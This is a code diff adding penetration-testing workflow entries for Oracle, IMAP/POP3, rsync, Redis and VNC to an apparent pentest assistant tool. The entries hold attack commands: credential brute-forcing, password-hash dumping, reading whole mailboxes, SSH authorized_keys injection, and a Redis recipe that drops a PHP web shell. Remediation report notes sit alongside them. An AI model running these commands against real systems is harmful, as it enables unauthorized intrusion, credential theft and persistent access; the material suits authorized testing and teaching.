@@ -702,6 +702,339 @@ _WORKFLOWS: dict[str, Workflow] = {
         ),
         report_note="SNMP service on [TARGET_IP] accepts a default community string over [v1/v2c]. Recommend removing default community strings, migrating to SNMPv3 with auth+priv, and restricting source IPs.",
     ),
+    "oracle": Workflow(
+        service_id="oracle",
+        display_name="Oracle",
+        title="Oracle TNS (1521) — SID Enumeration & DBA Attacks",
+        priority=15,
+        when_to_use="Oracle TNS listener on 1521. SID enumeration is the gatekeeper — without a valid SID you cannot authenticate, even with credentials.",
+        checklist=(
+            "Probe the TNS listener with `nmap --script oracle-tns-version` to confirm version and reachability.",
+            "Enumerate SIDs (nmap `oracle-sid-brute` or ODAT's `sidguesser`).",
+            "Try common SIDs first: `XE`, `ORCL`, `DB`, `TEST`.",
+            "With a SID, attempt factory defaults: `scott/tiger`, `system/manager`, `sys/change_on_install`.",
+            "Run ODAT all-modules sweep for misconfigurations and weak credentials.",
+            "Once authenticated, enumerate privileges and look for OS command execution paths (DBMS_SCHEDULER, external procedures).",
+        ),
+        commands=(
+            (
+                "nmap -p1521 -sV --script oracle-tns-version,oracle-sid-brute [TARGET_IP]",
+                "Detect listener, version, and brute-force SIDs in one pass.",
+            ),
+            (
+                "./odat.py all -s [TARGET_IP]",
+                "Sweep every ODAT module — finds SIDs, credentials, and exploitable misconfigs.",
+            ),
+            (
+                "./odat.py passwordguesser -s [TARGET_IP] -d [SID]",
+                "Brute-force credentials for a known SID.",
+            ),
+            ("sqlplus [USER]/[PASS]@[TARGET_IP]/[SID]", "Connect with credentials."),
+            (
+                "sqlplus [USER]/[PASS]@[TARGET_IP]/[SID] as sysdba",
+                "Attempt SYSDBA login — full DBA access if it succeeds.",
+            ),
+            (
+                "select * from user_role_privs;",
+                "Inside sqlplus: enumerate the current user's privileges.",
+            ),
+            (
+                "select name, password from sys.user$;",
+                "Inside sqlplus: dump password hashes (requires DBA).",
+            ),
+        ),
+        expected_output="Listener version banner, valid SIDs (commonly XE/ORCL/DB), and on successful authentication: schema/table listings, role memberships, and password hashes for offline cracking.",
+        verification=(
+            "Confirm the listener is reachable: `tnscmd10g ping -h [TARGET_IP]`.",
+            "If nmap's SID brute returns nothing, retry with SecLists `oracle-sids.txt` (~2000 entries) — the bundled list is short.",
+        ),
+        troubleshooting=(
+            (
+                "odat/sqlplus 'connection refused' on 1521",
+                "Non-default port, or listener paused.",
+                "Scan ports 1521-1530; test reachability with `nc -nv [TARGET_IP] 1521`.",
+            ),
+            (
+                "SID brute-force returns no results",
+                "Uncommon SID in use.",
+                "Use SecLists `oracle-sids.txt` instead of nmap's short list.",
+            ),
+            (
+                "sqlplus 'ORA-12170: Connect timeout'",
+                "Listener filtering by source IP, or 1521 unreachable.",
+                "Confirm with `nc -nv [TARGET_IP] 1521`; pivot from an allowed host if available.",
+            ),
+            (
+                "sqlplus 'shared library' error on Linux",
+                "Oracle Instant Client paths missing from ldconfig.",
+                "`echo /usr/lib/oracle/<ver>/client64/lib > /etc/ld.so.conf.d/oracle.conf && sudo ldconfig`.",
+            ),
+        ),
+        report_note="Oracle TNS listener on [TARGET_IP]:1521 permits unauthenticated SID enumeration and (where applicable) factory-default credentials, giving DBA-level access — full schema read/write, password-hash extraction, and OS command execution via DBMS_SCHEDULER or external procedures. Recommend rotating all default Oracle accounts, restricting TNS listener access by IP, setting a listener password (`lsnrctl set password`), and disabling unused external procedures.",
+    ),
+    "imap-pop3": Workflow(
+        service_id="imap-pop3",
+        display_name="IMAP/POP3",
+        related=("smtp",),
+        title="IMAP/POP3 (110/143/993/995) — Mail Retrieval Enumeration",
+        priority=30,
+        when_to_use="Mail-retrieval ports exposed. Cleartext 143/110 leak credentials on shared segments; banner versions identify Dovecot/Courier/Exchange.",
+        checklist=(
+            "Banner-grab via nc/openssl on each open port to fingerprint server software and version.",
+            "Extract Organization, FQDN, and admin email from the SSL certificate on 993/995.",
+            "Test cleartext authentication on 143/110 — capture credentials if on the same network segment.",
+            "Spray known credentials with Hydra; IMAP/POP3 typically do not lock out.",
+            "On successful login: list folders, fetch mail bodies for embedded credentials, SSH keys, or internal correspondence.",
+        ),
+        commands=(
+            (
+                "nmap -sV -sC -p110,143,993,995 [TARGET_IP]",
+                "Versions, banners, and SSL cert details in one pass.",
+            ),
+            (
+                "openssl s_client -connect [TARGET_IP]:993",
+                "Interactive IMAPS session and certificate dump.",
+            ),
+            (
+                "openssl s_client -connect [TARGET_IP]:995",
+                "Interactive POP3S session and certificate dump.",
+            ),
+            (
+                "curl -k 'imaps://[TARGET_IP]' --user [USER]:[PASS] -v",
+                "Authenticated mailbox listing over IMAPS.",
+            ),
+            (
+                "hydra -L users.txt -P pass.txt imap://[TARGET_IP]",
+                "Brute-force IMAP credentials.",
+            ),
+            (
+                "A1 LOGIN [USER] [PASS]",
+                "Inside IMAP session: authenticate (every IMAP command needs a tag).",
+            ),
+            ('A1 LIST "" "*"', "Inside IMAP session: list every folder."),
+            (
+                "A1 FETCH 1:* (BODY.PEEK[])",
+                "Inside IMAP session: read all mail without marking as read.",
+            ),
+        ),
+        expected_output="Server vendor and version banner, SSL certificate metadata (O=, CN=, emailAddress=), valid user accounts, and mailbox content that often contains secrets — passwords, SSH keys, or internal correspondence.",
+        verification=(
+            "Cross-check SSL CN= against the target's hostname/domain context.",
+            "After authentication, confirm `LIST` returns at least INBOX; non-default folder names frequently mark sensitive content.",
+        ),
+        troubleshooting=(
+            (
+                "curl IMAP fails with SSL certificate error",
+                "Self-signed cert or hostname mismatch.",
+                "Add `-k`: `curl -k --user [USER]:[PASS] imaps://[TARGET_IP]/INBOX`.",
+            ),
+            (
+                "STARTTLS rejected on 143",
+                "Server is TLS-only on 993.",
+                "Connect directly with `openssl s_client -connect [TARGET_IP]:993 -quiet`.",
+            ),
+            (
+                "AUTH LOGIN returns '535 Authentication failed' with valid creds",
+                "Wrong auth mechanism or account locked.",
+                "Try `AUTH PLAIN` with base64(`\\0[USER]\\0[PASS]`); confirm account state via SMTP VRFY or LDAP.",
+            ),
+            (
+                "Telnet to 993/995 drops immediately",
+                "Service requires TLS from the first byte.",
+                "Use `openssl s_client -connect [TARGET_IP]:993 -quiet` for an interactive IMAPS session.",
+            ),
+            (
+                "Hydra returns all attempts failed",
+                "Rate limiting or connection reset.",
+                "Drop threads to `-t 2`, add delay `-W 5`; verify the login format with `-e ns`.",
+            ),
+        ),
+        report_note="Mail-retrieval services on [TARGET_IP] accept plaintext IMAP/POP3 authentication on ports 143/110, exposing credentials to anyone on a shared network segment. Captured credentials enable mailbox content access (with embedded secrets — passwords, SSH keys) and lateral movement where credentials are reused. Recommend disabling cleartext IMAP/POP3, enforcing IMAPS (993) and POP3S (995) only, and setting `disable_plaintext_auth=yes` (Dovecot) or equivalent.",
+    ),
+    "rsync": Workflow(
+        service_id="rsync",
+        display_name="rsync",
+        related=("ssh",),
+        title="rsync (873) — Unauthenticated Share Discovery",
+        priority=20,
+        when_to_use="rsync daemon exposed on 873. Modules may be readable — and sometimes writable — without authentication.",
+        checklist=(
+            "Probe the daemon: `rsync [TARGET_IP]::` or `nc -nv [TARGET_IP] 873`.",
+            "List each module's contents: `rsync --list-only rsync://[TARGET_IP]/[MODULE]`.",
+            "Pull anything readable into `loot/`; inspect for SSH keys, configs, and credentials.",
+            "Test write access cautiously by uploading a marker file. Writable modules enable authorized_keys injection for persistent access (lab-only).",
+            "Document each module: name, access mode, and credential requirement.",
+        ),
+        commands=(
+            ("nmap -sV -p873 [TARGET_IP]", "Confirm the rsync daemon and its version."),
+            (
+                "nc -nv [TARGET_IP] 873",
+                "Probe protocol directly — banner shows daemon version.",
+            ),
+            ("rsync [TARGET_IP]::", "List all advertised modules."),
+            (
+                "rsync --list-only rsync://[TARGET_IP]/[MODULE]",
+                "List a module's contents without downloading.",
+            ),
+            (
+                "rsync -av rsync://[TARGET_IP]/[MODULE] ./loot/[MODULE]",
+                "Download an entire module.",
+            ),
+            (
+                "rsync -av ./marker.txt rsync://[TARGET_IP]/[MODULE]/",
+                "Test write access — leave a marker, not a payload.",
+            ),
+        ),
+        expected_output="Daemon banner with version, a list of module names with optional comments, and (if anonymous-readable) the file tree of at least one module.",
+        verification=(
+            "If module listing succeeds but access is denied, check whether the daemon's `hosts allow` restricts to a different subnet.",
+            "Confirm write access cautiously: read first, write a tiny marker, then remove it.",
+        ),
+        troubleshooting=(
+            (
+                "rsync times out despite port 873 open",
+                "Daemon expects a module name in the path.",
+                "List modules first: `rsync [TARGET_IP]::`; then access with `rsync -av [TARGET_IP]::[MODULE] /tmp/loot`.",
+            ),
+            (
+                "Modules listed but access denied",
+                "IP allowlist on the daemon.",
+                "Pivot from an allowed host inside the network; inspect `hosts allow` in `rsyncd.conf` if locally accessible.",
+            ),
+            (
+                "'auth failed on module' error",
+                "Module configured with `auth users` + `secrets file`.",
+                "Spray known credentials; check engagement writeups for default rsync creds.",
+            ),
+        ),
+        report_note="rsync daemon on [TARGET_IP]:873 advertises modules accessible without authentication, exposing read (and in some cases write) access to the underlying filesystem. Read access enables exfiltration of configs, keys, and credentials; write access enables persistent access via `authorized_keys` injection. Recommend requiring authentication on every rsync module (`auth users` + `secrets file`), restricting access by IP (`hosts allow`), and removing unused modules.",
+    ),
+    "redis": Workflow(
+        service_id="redis",
+        display_name="Redis",
+        title="Redis (6379) — Unauthenticated Access & RCE Paths",
+        priority=15,
+        when_to_use="Redis on 6379. Default Redis deployments are unauthenticated — confirm read access before assuming credentials are needed.",
+        checklist=(
+            "Probe with `redis-cli -h [TARGET_IP] INFO` — confirms unauth access and dumps server metadata.",
+            "Enumerate keys: `KEYS '*'` on small databases, or `SCAN` for large ones.",
+            "Dump the database with `--rdb dump.rdb` and inspect with `strings`.",
+            "Check `CONFIG GET dir` and `CONFIG GET dbfilename` — needed for RCE via file write.",
+            "RCE path 1: web-shell drop. `CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; SET payload '<?php system($_GET[\"c\"]); ?>'; SAVE`.",
+            "RCE path 2: SSH key injection. `CONFIG SET dir ~/.ssh; CONFIG SET dbfilename authorized_keys; SET key '<your pub key>'; SAVE`.",
+            "Redis >= 4.0: try `MODULE LOAD` for direct RCE via a malicious module (lab-only, destructive).",
+        ),
+        commands=(
+            (
+                "nmap -sV -p6379 --script redis-info [TARGET_IP]",
+                "Detect Redis and dump INFO if unauthenticated.",
+            ),
+            (
+                "redis-cli -h [TARGET_IP] INFO",
+                "Server metadata — version, role, configured modules, persistence settings.",
+            ),
+            (
+                "redis-cli -h [TARGET_IP] CONFIG GET '*'",
+                "Dump full server config — exposes `dir`, `dbfilename`, `requirepass`.",
+            ),
+            (
+                "redis-cli -h [TARGET_IP] KEYS '*'",
+                "List all keys (small databases only; use SCAN otherwise).",
+            ),
+            (
+                "redis-cli -h [TARGET_IP] -a [PASS] INFO",
+                "Authenticated variant when AUTH is required.",
+            ),
+            (
+                "redis-cli -h [TARGET_IP] --rdb dump.rdb",
+                "Download the binary RDB snapshot for offline analysis.",
+            ),
+        ),
+        expected_output="Server banner with `redis_version`, role (master/slave/sentinel), configured modules, persistence settings, and (on unauth) the entire keyspace with values.",
+        verification=(
+            "If `INFO` returns content, you have unauthenticated read at minimum.",
+            "Confirm RCE paths only on authorized lab targets — file writes are destructive and may break the service.",
+        ),
+        troubleshooting=(
+            (
+                "(error) NOAUTH Authentication required",
+                "`requirepass` is set on the server.",
+                "Try empty password first, then common defaults (`-a ''`, `-a redis`); brute-force with `hydra -P pass.txt redis://[TARGET_IP]`.",
+            ),
+            (
+                "CONFIG SET disabled",
+                "`CONFIG` command renamed or removed via `rename-command`.",
+                "Check `INFO` for renamed commands; some hardened Redis instances disable `CONFIG` and `FLUSHALL` entirely.",
+            ),
+            (
+                "File write via SAVE fails",
+                "`dir` is read-only for the redis user, or `dbfilename` is invalid for the path.",
+                "Verify the directory is writable (`ls -ld [DIR]`); fall back to RDB-only extraction.",
+            ),
+            (
+                "Redis on a non-default port",
+                "Custom port to evade default scans.",
+                "Service-version scan (`nmap -sV`) detects Redis regardless of port.",
+            ),
+        ),
+        report_note="Redis instance on [TARGET_IP]:6379 accepts unauthenticated commands, exposing the entire keyspace and enabling remote code execution via the `CONFIG SET` + `SAVE` file-write technique (web-shell drop into a served directory, or SSH `authorized_keys` injection on the redis user's home). Recommend setting a strong `requirepass`, binding Redis to localhost only (`bind 127.0.0.1`), renaming or disabling `CONFIG` and `FLUSHALL` via `rename-command`, and enabling protected-mode.",
+    ),
+    "vnc": Workflow(
+        service_id="vnc",
+        display_name="VNC",
+        related=("rdp",),
+        title="VNC (5900) — Authentication Bypass & Cracking",
+        priority=20,
+        when_to_use="VNC exposed on the 5900-5999 range. Authentication is typically a single password (no username), and the protocol is brute-forceable.",
+        checklist=(
+            "Identify the VNC variant and auth requirements: `nmap --script vnc-info,vnc-title`.",
+            "Test for the RealVNC auth bypass (CVE-2019-13615) with `nmap --script realvnc-auth-bypass`.",
+            "Try connecting with no password — some installs accept it.",
+            "Spray common VNC passwords with Hydra or the Metasploit `vnc_login` module.",
+            "On reaching the desktop: fingerprint the OS, note the logged-in user, check open apps for unsaved credentials, and inspect clipboard history.",
+        ),
+        commands=(
+            (
+                "nmap -sV -p5900-5905 --script vnc-info,vnc-title,realvnc-auth-bypass [TARGET_IP]",
+                "Detect VNC, variant, auth scheme, current desktop title; tests the RealVNC bypass.",
+            ),
+            (
+                "vncviewer [TARGET_IP]::5900",
+                "Interactive connect — a password prompt indicates auth is required.",
+            ),
+            (
+                "hydra -P pass.txt -s 5900 [TARGET_IP] vnc",
+                "Brute-force the VNC password.",
+            ),
+            (
+                "msfconsole -q -x 'use auxiliary/scanner/vnc/vnc_login; set RHOSTS [TARGET_IP]; set PASS_FILE pass.txt; run; exit'",
+                "Metasploit VNC login spray with thread/timing controls.",
+            ),
+        ),
+        expected_output="VNC server name (RealVNC / TightVNC / UltraVNC), protocol version, auth scheme (None / VNC password / TLS), current desktop title, and on successful login a full graphical session.",
+        verification=(
+            "If `nmap --script realvnc-auth-bypass` reports vulnerable, exploit through `vncviewer` with an empty password.",
+            "After login, screenshot the desktop and the title bar — both are useful report evidence.",
+        ),
+        troubleshooting=(
+            (
+                "vncviewer 'Connection refused'",
+                "VNC running on a non-5900 port.",
+                "Sweep 5900-5910: `nmap -p5900-5910 -sV [TARGET_IP]`; some setups expose 5800 for the Java applet.",
+            ),
+            (
+                "Hydra returns no successes despite a known weak password",
+                "VNC variant uses non-standard authentication.",
+                "Confirm the scheme via `nmap --script vnc-info`; TigerVNC TLS and UltraVNC MS-Logon need different tooling.",
+            ),
+            (
+                "Connect succeeds but immediately disconnects",
+                "Color-depth or encoding negotiation failure between client and server.",
+                "Force a depth: `vncviewer -depth 8 [TARGET_IP]::5900`; try `-Encoding raw`.",
+            ),
+        ),
+        report_note="VNC server on [TARGET_IP]:5900 accepts weak or default password authentication, granting remote graphical access to the target as the logged-in user. Recommend retiring VNC where SSH or RDP suffices; otherwise enforce a strong random password (16+ characters), bind to a management interface only, require TLS (TigerVNC) or VPN access, and apply the latest patches — multiple VNC variants have shipped pre-auth RCE vulnerabilities.",
+    ),
     "linux-privesc": Workflow(
         service_id="linux-privesc",
         display_name="Linux Privesc",
